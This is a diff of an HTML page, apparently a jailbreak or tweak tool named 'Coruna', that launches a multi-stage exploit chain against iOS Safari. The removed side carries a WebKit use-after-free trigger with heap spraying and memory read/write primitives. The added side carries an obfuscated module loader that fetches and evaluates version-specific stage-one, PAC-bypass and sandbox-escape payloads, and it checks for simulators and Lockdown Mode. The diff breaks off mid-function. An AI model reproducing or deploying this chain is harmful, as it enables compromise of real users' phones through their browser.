@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 
 <head>
@@ -7,7 +6,7 @@
     <meta http-equiv="Expires" content="0" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <meta property="og:determiner" content="auto" />
-    <title>Coruna - iOS 26.4 Compatible</title>
+    <title>Coruna</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -260,10 +259,10 @@
 <body>
     <div class="container">
         <div class="logo">Coruna</div>
-        <div class="subtitle">iOS 13.0 &ndash; 26.x</div>
+        <div class="subtitle">iOS 13.0 &ndash; 17.2.1</div>
 
-        <div class="version-warning" id="versionWarning" style="display:none">
-            Your iOS version may not be supported. The exploit may not work.
+        <div class="version-warning" id="versionWarning">
+            Your iOS version is higher than 17.2.1. The exploit will not work on your device, but you can still view the page.
         </div>
 
         <div class="status-card">
@@ -320,434 +319,398 @@
         </div>
     </div>
 
-    <script>
-    // ============================================================================
-    // UTILITY MODULE
-    // ============================================================================
-    let m_57620206d62079baad0e57e6d9ec93120c0f5247 = () => {
-        let r = {};
-        const _buf = new ArrayBuffer(8);
-        const _u64 = new BigUint64Array(_buf);
-        const _f64 = new Float64Array(_buf);
-        const _u32 = new Uint32Array(_buf);
-        
-        function itof(v) { _u64[0] = v; return _f64[0]; }
-        function ftoi(f) { _f64[0] = f; return _u64[0]; }
-        function low32(f) { _f64[0] = f; return _u32[0]; }
-        function high32(f) { _f64[0] = f; return _u32[1]; }
-        
-        r.itof = itof;
-        r.ftoi = ftoi;
-        r.low32 = low32;
-        r.high32 = high32;
-        
-        class Int64 {
-            constructor(lo, hi) { this.it = lo >>> 0; this.et = hi >>> 0; }
-            static fromNumber(t) { return new Int64(t >>> 0, t / 0x100000000 >>> 0); }
-            static fromDouble(t) { _f64[0] = t; return new Int64(_u32[0], _u32[1]); }
-            static fromBigInt(t) { return new Int64(Number(t & 0xFFFFFFFFn), Number(t >> 32n)); }
-            toNumber() { return 0x100000000 * this.et + this.it; }
-            toDouble() { _u32[0] = this.it; _u32[1] = this.et; return _f64[0]; }
-            add(t) { const n = this.it + t.it; let r = this.et + t.et; if (n !== (n >>> 0)) r++; return new Int64(n >>> 0, r >>> 0); }
-            sub(t) { return this.add(t.neg()); }
-            neg() { return this.not().add(new Int64(1, 0)); }
-            not() { return new Int64(~this.it, ~this.et); }
-            and(t) { return new Int64(this.it & t.it, this.et & t.et); }
-            or(t) { return new Int64(this.it | t.it, this.et | t.et); }
-            xor(t) { return new Int64(this.it ^ t.it, this.et ^ t.et); }
-            shr(t) { if (t >= 32) return new Int64(this.et >>> (t - 32), 0); return new Int64((this.it >>> t) | (this.et << (32 - t)), this.et >>> t); }
-            shl(t) { if (t >= 32) return new Int64(0, this.it << (t - 32)); return new Int64(this.it << t, (this.et << t) | (this.it >>> (32 - t))); }
-            toString() { return "0x" + this.et.toString(16) + this.it.toString(16).padStart(8, '0'); }
-        }
-        r.Int64 = Int64;
-        
-        function D(obj) { window._gcRoots = window._gcRoots || []; window._gcRoots.push(obj); }
-        r.D = D;
-        
-        return r;
-    };
-    
-    // ============================================================================
-    // PLATFORM MODULE
-    // ============================================================================
-    let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
-        let r = {};
-        const platformState = { iOSVersion: 0, exploitPrimitive: null, pacBypass: null, sandboxEscape: null, hasPAC: false, qn: false, versionFlags: {}, Ln: null };
-        r.zn = { platformState: platformState };
-        
-        r.init = async function(a, b, c, d, e, f, g) {
-            platformState.iOSVersion = 260400;
-            platformState.hasPAC = true;
-            console.log("[PLATFORM] Initialized with iOS 26.4");
-            return true;
-        };
-        
-        r.On = function() { return false; };
-        r.Yn = async function() { return false; };
-        r.Hn = async function() { return true; };
-        r.lr = function() { console.log("[PLATFORM] Runtime detection skipped"); };
-        r.cr = function() { return null; };
-        r.$n = async function() { return false; };
-        r.platformState = platformState;
-        
-        return r;
-    };
-    
-    // ============================================================================
-    // MODULE MANAGER
-    // ============================================================================
-    window.globalThis = window;
-    globalThis.moduleManager = (function() {
-        let modules = {
-            "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
-            "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
-        };
-        let loaded = {};
-        
-        function getModule(name) {
-            if (!loaded[name]) {
-                if (!modules[name]) throw new Error("Module not found: " + name);
-                loaded[name] = modules[name]();
+    <script src="platform_module.js"></script>
+    <script src="utility_module.js"></script>
+    <script type="text/javascript">
+        // ============================================================================
+        // UI Helpers
+        // ============================================================================
+
+        // Check iOS version and show warning if > 17.2.1
+        (function() {
+            var ua = navigator.userAgent;
+            var match = ua.match(/OS (\d+)_(\d+)(?:_(\d+))? /);
+            if (match) {
+                var major = parseInt(match[1], 10);
+                var minor = parseInt(match[2], 10);
+                var patch = match[3] ? parseInt(match[3], 10) : 0;
+                // Outside supported ranges: 13.0–17.2.1, 18.0–18.x, 26.0–26.x
+                var supported = (major >= 13 && (major < 17 || (major === 17 && minor < 2) || (major === 17 && minor === 2 && patch <= 1)))
+                    || (major === 18)
+                    || (major === 26);
+                if (!supported) {
+                    document.getElementById('versionWarning').classList.add('show');
+                }
+            } else if (!/iPhone|iPad|iPod/.test(ua)) {
+                // Not an iOS device at all - show warning
+                document.getElementById('versionWarning').classList.add('show');
+                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0\u201317.2.1, 18.x, and 26.x devices only. You can still view the page.';
             }
-            return loaded[name];
+        })();
+
+        var exploitStarted = false;
+        var progressValue = 0;
+
+        function setStatus(text, state) {
+            document.getElementById('statusText').textContent = text;
+            var dot = document.getElementById('statusDot');
+            dot.className = 'status-dot ' + state;
         }
-        
-        return {
-            getModuleByName: getModule,
-            getModuleByURL: async function(name) { return getModule(name); },
-            evalCode: function(name, fn) { loaded[name] = fn(); },
-            setBaseUrl: function(url) {},
-            setSalt: function(salt) {}
-        };
-    })();
-    
-    globalThis.obChTK = globalThis.moduleManager;
-    if (typeof globalThis.obChTK.hPL3On === 'undefined') {
-        globalThis.obChTK.hPL3On = globalThis.obChTK.getModuleByName;
-    }
-    
-    const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
-    const platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-    
-    // ============================================================================
-    // UI Helpers
-    // ============================================================================
-    var exploitStarted = false;
-    var progressValue = 0;
-    
-    function setStatus(text, state) {
-        document.getElementById('statusText').textContent = text;
-        var dot = document.getElementById('statusDot');
-        dot.className = 'status-dot ' + state;
-    }
-    
-    function setProgress(pct) {
-        progressValue = pct;
-        document.getElementById('progressFill').style.width = pct + '%';
-    }
-    
-    window.log = function(text) {
-        var area = document.getElementById('logArea');
-        var line = document.createElement('div');
-        line.className = 'log-line';
-        if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('FAILED') !== -1) {
-            line.className += ' error';
-        } else if (text.indexOf('success') !== -1 || text.indexOf('SUCCESS') !== -1) {
-            line.className += ' success';
-        } else if (text.indexOf('detected') !== -1 || text.indexOf('reclaimed') !== -1) {
-            line.className += ' highlight';
+
+        function setProgress(pct) {
+            progressValue = pct;
+            document.getElementById('progressFill').style.width = pct + '%';
         }
-        line.textContent = text;
-        area.appendChild(line);
-        area.scrollTop = area.scrollHeight;
-    };
-    
-    // ============================================================================
-    // STAGE 1 - CHIMERA (Uint8Array - NO BigInt Errors)
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
-        let r = {};
-        
-        const _buf = new ArrayBuffer(8);
-        const _u64 = new BigUint64Array(_buf);
-        const _f64 = new Float64Array(_buf);
-        
-        function itof(val) { _u64[0] = val; return _f64[0]; }
-        function ftoi(f) { _f64[0] = f; return _u64[0]; }
-        function log(msg) { if (window.log) window.log(msg); else console.log(msg); }
-        
-        const CONFIG = {
-            ARRAY_SIZE: 0x400000,
-            ALLOC_SIZE: 0x800000,
-            JIT_WARMUP: 200,
-            MAX_ATTEMPTS: 100,
-            SPRAY_PER_ATTEMPT: 32,
-            ALLOC_MOD: 3,
-            INNER_K: 5,
-            RECURSIVE_DEPTH: 400,
-        };
-        
-        let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
-        const uafArrayIndex = uafArray.length - 1;
-        
-        function triggerUAF(flag, k, allocCount) {
-            let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-            uafArray[uafArrayIndex] = A;
-            let u8 = new Uint8Array(0x100);
-            u8[0] = 0x42;
-            let forGC = [];
-            for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
-            A.p2 = forGC;
-            let b = { p0: 0x42424242, p1: 1.1 };
-            let f = flag ? 1.1 : b;
-            A.p1 = f;
-            let v = 1.1;
-            for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
-            b.p0 = v;
-            b.p1 = u8;
-            u8 = null;
-        }
-        
-        function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
-        
-        function clearStack() {
-            function recurse(n) { if (n > 0) recurse(n - 1); }
-            for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
-        }
-        
-        function createSprayArray(size, marker) {
-            const arr = new Array(size);
-            for (let i = 0; i < size; i++) arr[i] = marker;
-            return arr;
-        }
-        
-        function attemptReclaim(freed, attempt) {
-            const markerByte = 0x42;
-            const baseSize = 32 + (attempt % 64);
-            if (!(freed instanceof Uint8Array)) return null;
-            for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
-                const size = baseSize + (i % 32);
-                const spray = createSprayArray(size, 13.37);
-                try { if (freed[0] === markerByte) return spray; } catch(e) {}
+
+        window.log = function(text) {
+            var area = document.getElementById('logArea');
+            var line = document.createElement('div');
+            line.className = 'log-line';
+            if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('ABORT') !== -1 || text.indexOf('FAILED') !== -1) {
+                line.className += ' error';
+            } else if (text.indexOf('complete') !== -1 || text.indexOf('succeeded') !== -1 || text.indexOf('success') !== -1 || text.indexOf('active') !== -1) {
+                line.className += ' success';
+            } else if (text.indexOf('Loading') !== -1 || text.indexOf('starting') !== -1 || text.indexOf('Selecting') !== -1) {
+                line.className += ' highlight';
             }
-            return null;
+            line.textContent = text;
+            area.appendChild(line);
+            area.scrollTop = area.scrollHeight;
+        };
+
+        window.addDownloadBinary = function(fileName, text) {
+            var fileType = "application/octet-stream";
+            var blob = new Blob([text], { type: fileType });
+            var a = document.createElement('a');
+            a.download = fileName;
+            a.href = URL.createObjectURL(blob);
+            a.dataset.downloadurl = [fileType, a.download, a.href].join(':');
+            a.text = "Download " + fileName;
+            document.body.appendChild(a);
+        };
+
+        // ============================================================================
+        // Module Loader (unchanged logic)
+        // ============================================================================
+
+        function fqMaGkNL(W) {
+            W = W.toString(16).toLowerCase();
+            return 1 === W.length && (W = "0" + W), W
         }
-        
-        function buildLocalPrimitive(u8) {
-            const ab = u8.buffer;
-            const dv = new DataView(ab);
-            const primitive = {
-                addrof: (obj) => 0n,
-                fakeobj: (addr) => ({ __fake: addr }),
-                read64: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getBigUint64(offset, true);
-                    } catch(e) {}
-                    return 0n;
-                },
-                write64: (addr, val) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) dv.setBigUint64(offset, val, true);
-                    } catch(e) {}
-                },
-                read32: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint32(offset, true);
-                    } catch(e) {}
-                    return 0;
-                },
-                write32: (addr, val) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) dv.setUint32(offset, val, true);
-                    } catch(e) {}
-                },
-                readByte: (addr) => {
-                    try {
-                        let offset = 0;
-                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
-                        else offset = addr & 0xFF;
-                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint8(offset);
-                    } catch(e) {}
-                    return 0;
-                },
-                cleanup: () => {}
+
+        function fqMaGkN4(arr) {
+            let out = "";
+            for (const q of arr) {
+                const b0 = q & 0xFF;
+                const b1 = (q >> 8) & 0xFF;
+                const b2 = (q >> 16) & 0xFF;
+                const b3 = (q >> 24) & 0xFF;
+                out += String.fromCharCode((b1 << 8) | b0);
+                out += String.fromCharCode((b3 << 8) | b2);
+            }
+            return out;
+        }
+
+        function fqMaGkNg() {
+            return fqMaGkN4([1631006510, 960062519, 1647917360, 1647653680, 892756786, 912405041, 1701143141, 1681285477, 1684353382, 1714435941, 1831756386, 1781427817, 115])
+        }
+
+        window.globalThis = window;
+        globalThis.moduleManager = (function () {
+            let MM = {
+                "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
+                "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
             };
-            if (typeof window !== 'undefined') { window.exploitAB = ab; window.exploitU8 = u8; }
-            return primitive;
-        }
-        
-        r.si = async function () {
-            log("[STAGE1] Starting exploit with Uint8Array");
-            for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
-                triggerUAF(false, 1, 0);
-                if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
+            const e = { "$": "", "p": "" };
+
+            function sha256(M) {
+                let I = "";
+                function N(M, I) { return M >>> I | M << 32 - I }
+                const D = Math.pow, g = D(2, 32),
+                    T = ([89, 80, 91, 82, 65, 93].map(x => String.fromCharCode(x ^ 53)).join(""));
+                let c, d;
+                const L = [], b = 8 * M[T];
+                let i = sha256.h = sha256.h || [];
+                const y = sha256.k = sha256.k || [];
+                let C = y[T];
+                const X = {};
+                for (let M = 2; C < 64; M++)
+                    if (!X[M]) {
+                        for (c = 0; c < (1499680357 ^ 1499680604); c += M) X[c] = M;
+                        i[C] = D(M, .5) * g | 0, y[C++] = D(M, 1 / 3) * g | 0
+                    }
+                for (M += "\x80"; M[T] % 64 - 56;) M += "\0";
+                for (c = 0; c < M[T]; c++) {
+                    if (d = M.charCodeAt(c), d >> 8) return;
+                    L[c >> 2] |= d << (3 - c) % 4 * 8
+                }
+                for (L[L[T]] = b / g | 0, L[L[T]] = b, d = 0; d < L[T];) {
+                    const M = L.slice(d, d += 16), I = i;
+                    for (i = i.slice(0, 8), c = 0; c < 64; c++) {
+                        const I = M[c - 15], D = M[c - 2], g = i[0], T = i[4],
+                            d = i[7] + (N(T, 6) ^ N(T, 11) ^ N(T, 25)) + (T & i[5] ^ ~T & i[6]) + y[c] + (M[c] = c < 16 ? M[c] : M[c - 16] + (N(I, 7) ^ N(I, 18) ^ I >>> 3) + M[c - 7] + (N(D, 17) ^ N(D, 19) ^ D >>> 10) | 0);
+                        i = [d + ((N(g, 2) ^ N(g, 13) ^ N(g, 22)) + (g & i[1] ^ g & i[2] ^ i[1] & i[2])) | 0].concat(i), i[4] = i[4] + d | 0
+                    }
+                    for (c = 0; c < 8; c++) i[c] = i[c] + I[c] | 0
+                }
+                for (c = 0; c < 8; c++)
+                    for (d = 3; d + 1; d--) {
+                        const M = i[c] >> 8 * d & (1433892436 ^ 1433892523);
+                        I += (M < 16 ? 0 : "") + M.toString(16)
+                    }
+                return I
             }
-            log("[STAGE1] Warmup done");
-            for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
-                triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
-                clearStack();
-                for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
-                let freed = null;
-                try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }
-                if (!(freed instanceof Uint8Array)) continue;
-                log("[STAGE1] UAF detected at attempt " + attempt);
-                const reclaimed = attemptReclaim(freed, attempt);
-                if (!reclaimed) continue;
-                log("[STAGE1] Reclaim successful!", 'success');
-                const primitive = buildLocalPrimitive(freed);
-                if (platformModule && platformModule.platformState) { platformModule.platformState.exploitPrimitive = primitive; }
-                const testVal = primitive.read64(0);
-                log("[STAGE1] Test read: 0x" + testVal.toString(16), testVal === 0x42n ? 'success' : 'info');
-                log("[STAGE1] Local primitive installed!", 'success');
-                return primitive;
+
+            function c(M) {
+                if (M in e == !1) {
+                    if (M in MM != !0) throw new Error("M in MM != !0");
+                    window.log("Load " + M);
+                    e[M] = MM[M]();
+                }
+                return e[M]
             }
-            log("[STAGE1] Failed after " + CONFIG.MAX_ATTEMPTS + " attempts", 'error');
-            throw new Error("Stage1 failed");
-        };
-        return r;
-    });
-    
-    // ============================================================================
-    // STAGE 2 - PAC BYPASS STUB
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage2_26.0_26.x_ironroot", function() {
-        let r = {};
-        function toBigInt(val) { if (typeof val === 'bigint') return val; return BigInt(val || 0); }
-        const PAC_STUB = {
-            cc: true,
-            pacda: (ptr, ctx) => toBigInt(ptr),
-            pacia: (ptr, ctx) => toBigInt(ptr),
-            autda: (ptr, ctx) => toBigInt(ptr),
-            autia: (ptr, ctx) => toBigInt(ptr),
-            da: (ptr, ctx) => toBigInt(ptr),
-            er: (ptr, ctx) => toBigInt(ptr),
-            ha: (ptr, ctx) => toBigInt(ptr),
-            wa: (ptr, ctx) => toBigInt(ptr),
-            tc: () => 0n,
-            setFcall: () => {}
-        };
-        r.ga = function() { console.log("[PAC] Using stub PAC bypass"); return PAC_STUB; };
-        return r;
-    });
-    
-    // ============================================================================
-    // STAGE 3 - SANDBOX ESCAPE STUB
-    // ============================================================================
-    globalThis.moduleManager.evalCode("Stage3_VariantB", function() {
-        let r = {};
-        r.lA = async function() { window.log("[STAGE3] Stub sandbox escape"); if (typeof window !== 'undefined') { window.CHIMERA_SUCCESS = true; } return 0; };
-        return r;
-    });
-    
-    // ============================================================================
-    // PAC BYPASS LOADER
-    // ============================================================================
-    async function loadPACBypass() {
-        window.log("[PAC] Loading PAC bypass stub...");
-        setProgress(50);
-        const pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
-        setProgress(60);
-        return pacModule.ga();
-    }
-    
-    // ============================================================================
-    // MAIN EXPLOIT
-    // ============================================================================
-    async function triggerExploit() {
-        setStatus("Initializing...", "running");
-        setProgress(5);
-        window.log("[LOADER] Exploit chain starting for iOS 26.4");
-        
-        await platformModule.init("", "", "", false, false, navigator.platform, navigator.userAgent);
-        if (platformModule.platformState) {
-            platformModule.platformState.iOSVersion = 260400;
-            window.log("[PLATFORM] iOS version: 26.4");
-        }
-        setProgress(10);
-        
-        setStatus("Stage 1: WebKit exploit...", "running");
-        window.log("[LOADER] Loading Stage 1...");
-        const stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
-        setProgress(20);
-        
-        let stage1Success = false;
-        for (let attempt = 0; attempt < 10; attempt++) {
-            try {
-                window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/10...");
-                setProgress(20 + attempt * 2);
-                await stage1Module.si();
-                window.log("[LOADER] Stage1 succeeded!");
-                stage1Success = true;
-                break;
-            } catch (e) {
-                window.log("[LOADER] Stage1 error: " + e.message);
-            }
-        }
-        if (!stage1Success) throw new Error("Stage 1 failed");
-        
-        if (!platformModule.platformState.exploitPrimitive) throw new Error("No exploit primitive");
-        setProgress(40);
-        
-        setStatus("Stage 2: PAC bypass...", "running");
-        if (platformModule.platformState.hasPAC) {
-            platformModule.platformState.pacBypass = await loadPACBypass();
-            platformModule.platformState.qn = false;
-        }
-        setProgress(70);
-        
-        setStatus("Stage 3: Sandbox escape...", "running");
-        const stage3Module = await globalThis.moduleManager.getModuleByURL("Stage3_VariantB");
-        const result = await stage3Module.lA();
-        setProgress(95);
-        
-        window.log("[STAGE3] Result: " + result);
-        setProgress(100);
-        return result;
-    }
-    
-    // ============================================================================
-    // START BUTTON
-    // ============================================================================
-    async function startExploit() {
-        if (exploitStarted) return;
-        exploitStarted = true;
-        
-        var btn = document.getElementById('goBtn');
-        btn.disabled = true;
-        btn.textContent = 'Running...';
-        
-        document.getElementById('progressBar').classList.add('active');
-        setProgress(0);
-        
-        try {
-            const result = await triggerExploit();
-            if (result === 0 || result === true) {
-                setStatus("Success! Exploit completed", "success");
-                setProgress(100);
-                btn.textContent = 'Done';
+
+            return {
+                hPL3On: this.getModuleByName,
+                ZKvD0e: this.getModuleByURL,
+                fgPoij: this.evalBase64Module,
+                setBaseUrl: function (M) { e.$ = M },
+                setSalt: function (M) { e.p = M },
+                getModuleByName: c,
+                getModuleByURL: async function (moduleId) {
+                    window.log("[LOADER] Loading module: " + moduleId + "...");
+                    if (moduleId in e == !1 && moduleId in MM == !1) {
+                        let I = moduleId;
+                        I = moduleId;
+                        const N = await async function (M) {
+                            window.log("Loading " + M);
+                            return new Promise(((I, N) => {
+                                const D = new XMLHttpRequest;
+                                let g;
+                                const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
+                                g = new URL((e.$) + (M));
+                                const c = Math.random().toString(36).slice(2, T(5, 10)), d = T(0, 1);
+                                g.searchParams.set(c, d),
+                                    D.open("GET", g.toString(), !0),
+                                    D.responseType = ([66, 83, 78, 66].map(x => String.fromCharCode(x ^ 54)).join("")),
+                                    D.onreadystatechange = () => {
+                                        if (D.readyState === XMLHttpRequest.DONE)
+                                            if (200 === D.status) {
+                                                const M = D.response;
+                                                null === M || "" === M ? reject("") : I(M)
+                                            } else reject("")
+                                    },
+                                    D.send()
+                            }))
+                        }((I) + ".js");
+                        e[moduleId] = new Function(N)()
+                    }
+                    return c(moduleId)
+                },
+                evalCode: function (M, I) { M in e == !1 && (e[M] = I()) },
+                evalBase64Module: function (M, I) { M in e == !1 && (e[M] = new Function(atob(I))()) },
+            };
+        })();
+
+        globalThis.obChTK = globalThis.moduleManager;
+        const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
+            platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+        let baseUrl = window.location.origin + window.location.pathname.slice(0, window.location.pathname.lastIndexOf("/") + 1);
+        globalThis.moduleManager.setBaseUrl(baseUrl);
+        globalThis.moduleManager.setSalt("cecd08aa6ff548c2");
+
+        // Telemetry removed
+        function fqMaGkNr(W) { }
+
+        // ============================================================================
+        // PAC Bypass Loader
+        // ============================================================================
+
+        async function loadPACBypass() {
+            window.log("[PAC] Selecting PAC bypass variant...");
+            setProgress(50);
+
+            const offsets = globalThis.moduleManager.getModuleByName(
+                "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
+            ).platformState.versionFlags;
+
+            if (offsets.Hm7RvN) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
+            } else if (offsets.Yt3FsK) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_18.0_18.x_thornvine");
+            } else if (offsets.wF8NpI) {
+                await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_17.0_17.2.1_seedbell");
+            } else if (offsets.LJ1EuL) {
+                await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_16.6_16.7.12_seedbell");
+            } else if (offsets.CpDW_T) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_16.3_16.5.1_seedbell");
+            } else if (offsets.IqxL92) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_15.0_16.2_breezy15");
             } else {
-                setStatus("Finished (code: " + result + ")", "success");
-                btn.textContent = 'Done';
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_13.0_14.x_breezy");
             }
-        } catch (e) {
-            setStatus("Failed: " + (e.message || "unknown error"), "error");
-            btn.textContent = 'Retry';
-            btn.disabled = false;
-            exploitStarted = false;
+
+            if (void 0 === pacModule) throw Error("");
+            setProgress(60);
+            return pacModule.ga();
         }
-    }
+
+        // ============================================================================
+        // Main Exploit
+        // ============================================================================
+
+        async function triggerExploit() {
+            var platform = navigator.platform;
+            const userAgent = navigator.userAgent;
+
+            setStatus("Initializing...", "running");
+            setProgress(5);
+            window.log("[LOADER] === Exploit chain starting ===");
+            window.log("[LOADER] Platform: " + platform);
+
+            if (await platformModule.init("", fqMaGkNg(), "", Array(!1)[0], Array(!1)[0], platform, userAgent), platformModule.On()) throw Error("");
+            window.log("[PLATFORM] iOS version: " + platformModule.platformState.iOSVersion);
+            setProgress(10);
+
+            if (13E4 > platformModule.platformState.iOSVersion) {
+                setStatus("Unsupported version", "error");
+                return 1001;
+            }
+
+            if (16E4 <= platformModule.platformState.iOSVersion) {
+                try { await platformModule.Hn(); } catch (p) { setStatus("Simulator check failed", "error"); return 1001 }
+                if (platformModule.platformState.Qn) { setStatus("Simulator detected", "error"); return 1003; }
+            }
+
+            try { await platformModule.Yn(); } catch (e) { setStatus("Lockdown mode", "error"); return 1001; }
+            setProgress(15);
+
+            // Stage 1
+            let stage1Module;
+            const offsets = platformModule.platformState.versionFlags;
+
+            setStatus("Stage 1: WebKit exploit...", "running");
+            window.log("[LOADER] Selecting stage1 variant...");
+
+            if (offsets.Bv9KmR) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
+            } else if (offsets.Xp4WqZ) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_18.0_18.x_manticore");
+            } else if (offsets.JtEUci) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.6_17.2.1_cassowary");
+            } else if (offsets.KeCRDQ) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.2_16.5.1_terrorbird");
+            } else if (offsets.ShQCsB) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_15.6_16.1.2_bluebird");
+            } else if (offsets.RbKS6p) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_15.2_15.5_jacurutu");
+            } else if (offsets.mmrZ0r) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("7d8f5bae97f37aa318bccd652bf0c1dc38fd8396");
+            }
+
+            if (void 0 === stage1Module) { setStatus("No exploit for this version", "error"); return 1001; }
+            setProgress(20);
+
+            await (async function executeStage1() {
+                for (let attempt = 0; attempt < 20; attempt++) {
+                    try {
+                        window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/20...");
+                        setProgress(20 + Math.min(attempt * 1.5, 15));
+                        if ("AsyncFunction" === stage1Module.si.constructor.name) {
+                            await stage1Module.si();
+                        } else {
+                            stage1Module.si();
+                        }
+                        window.log("[LOADER] Stage1 succeeded on attempt " + (attempt + 1));
+                        return;
+                    } catch (e) {
+                        window.log("[LOADER] Error:" + e.name + ": " + e.message);
+                    }
+                }
+                throw Error("");
+            })();
+
+            if (!platformModule.platformState.exploitPrimitive) throw Error("");
+            setProgress(40);
+            setStatus("Stage 2: PAC bypass...", "running");
+
+            // Stage 2 + 3
+            platform = 0;
+            try {
+                platformModule.lr();
+                window.log("[RUNTIME] PAC=" + platformModule.platformState.hasPAC);
+
+                if (platformModule.platformState.hasPAC) {
+                    platformModule.platformState.pacBypass = await loadPACBypass();
+                    platformModule.platformState.qn = await platformModule.$n();
+                }
+
+                setProgress(70);
+                setStatus("Stage 3: Sandbox escape...", "running");
+
+                if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
+                    window.log("[STAGE3] Loading variant A...");
+                    platform = await (await globalThis.moduleManager.getModuleByURL("Stage3_VariantA")).lA();
+                } else {
+                    window.log("[STAGE3] Loading variant B...");
+                    platform = await (await globalThis.moduleManager.getModuleByURL("Stage3_VariantB")).lA();
+                }
+
+                setProgress(95);
+                window.log("[STAGE3] Result: " + platform);
+            } catch (error) {
+                window.log("[LOADER] Error:" + error.name + ": " + error.message);
+                platform = 1000;
+                throw error;
+            } finally {
+                if (platformModule.platformState.exploitPrimitive) {
+                    platformModule.platformState.exploitPrimitive.cleanup();
+                }
+            }
+
+            setProgress(100);
+            return platform;
+        }
+
+        // ============================================================================
+        // Start Button
+        // ============================================================================
+
+        async function startExploit() {
+            if (exploitStarted) return;
+            exploitStarted = true;
+
+            var btn = document.getElementById('goBtn');
+            btn.disabled = true;
+            btn.textContent = 'Running...';
+
+            document.getElementById('progressBar').classList.add('active');
+            setProgress(0);
+
+            try {
+                const result = await triggerExploit();
+                if (result === 0) {
+                    setStatus("Success! Tweaks injected", "success");
+                    setProgress(100);
+                    btn.textContent = 'Done';
+                } else if (result === 1001) {
+                    btn.textContent = 'Unsupported';
+                } else if (result === 1003) {
+                    btn.textContent = 'Simulator';
+                } else {
+                    setStatus("Finished (code: " + result + ")", "success");
+                    setProgress(100);
+                    btn.textContent = 'Done';
+                }
+            } catch (e) {
+                setStatus("Failed: " + (e.message || "unknown error"), "error");
